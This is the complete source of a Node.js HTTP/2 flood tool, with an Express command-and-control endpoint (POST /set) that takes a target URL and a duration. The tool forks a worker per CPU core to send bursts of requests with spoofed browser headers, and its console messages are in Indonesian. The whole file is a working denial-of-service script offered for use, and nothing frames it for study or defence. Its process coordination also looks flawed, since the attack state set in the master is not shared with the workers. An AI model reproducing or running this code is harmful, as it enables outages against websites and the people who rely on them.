const express = require('express');
const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

const app = express();
app.use(express.json());

let currentAttack = null;

const generateHeaders = (target) => ({
  ':method': 'GET',
  ':path': '/',
  'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-G991B)',
  'referer': target,
  'accept': '*/*',
  'accept-language': 'en-US,en;q=0.9',
  'cache-control': 'no-cache',
  'pragma': 'no-cache'
});

const flood = (target, duration) => {
  const end = Date.now() + duration * 1000;
  console.log(`[!] Menyerang ${target} selama ${duration} detik...`);

  function send() {
    if (Date.now() > end) return;
    try {
      const client = http2.connect(target, { maxConcurrentStreams: 100 });
      for (let i = 0; i < 100; i++) {
        const req = client.request(generateHeaders(target));
        req.on('error', () => {});
        req.end();
      }
      client.on('error', () => {});
    } catch (e) {}
    setTimeout(send, 50);
  }

  for (let i = 0; i < 50; i++) send();
};

// POST target
app.post('/set', (req, res) => {
  const { target, time } = req.body;
  if (!target || !time) return res.status(400).send("Data tidak lengkap.");

  if (currentAttack) {
    return res.send("Masih ada serangan aktif.");
  }

  currentAttack = { target, time };
  res.send("Attack dimulai.");

  // Fork CPU core untuk serangan
  const workers = os.cpus().length;
  for (let i = 0; i < workers; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    currentAttack = null;
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log("[✓] Serangan selesai.");
  }, time * 1000);
});

if (cluster.isMaster) {
  const PORT = Math.floor(Math.random() * (65535 - 1024) + 1024);
  app.listen(PORT, () => {
    console.log(`[C2] API aktif di port: ${PORT}`);
    console.log(`[INFO] Gunakan di Termux untuk mengatur target`);
  });
} else {
  setInterval(() => {
    if (currentAttack) {
      flood(currentAttack.target, currentAttack.time);
    }
  }, 1000);
}
